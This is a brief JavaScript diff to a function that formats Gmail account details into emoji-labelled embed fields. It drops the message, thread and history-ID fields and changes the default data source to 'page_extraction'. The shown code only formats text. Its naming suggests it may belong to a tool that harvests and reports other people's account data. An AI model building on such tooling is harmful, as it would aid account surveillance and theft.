@@ -1065,23 +1065,8 @@ function formatGmailAccountEmbed(logData) {
         inline: true
       },
       {
-        name: "📨 **Total Messages**",
-        value: userData.messagesTotal?.toString() || "Unknown",
-        inline: true
-      },
-      {
-        name: "💬 **Total Threads**",
-        value: userData.threadsTotal?.toString() || "Unknown",
-        inline: true
-      },
-      {
-        name: "🆔 **History ID**",
-        value: userData.historyId || "Unknown",
-        inline: true
-      },
-      {
         name: "📊 **Data Source**",
-        value: userData.source || "API",
+        value: userData.source || "page_extraction",
         inline: true
       }
     );
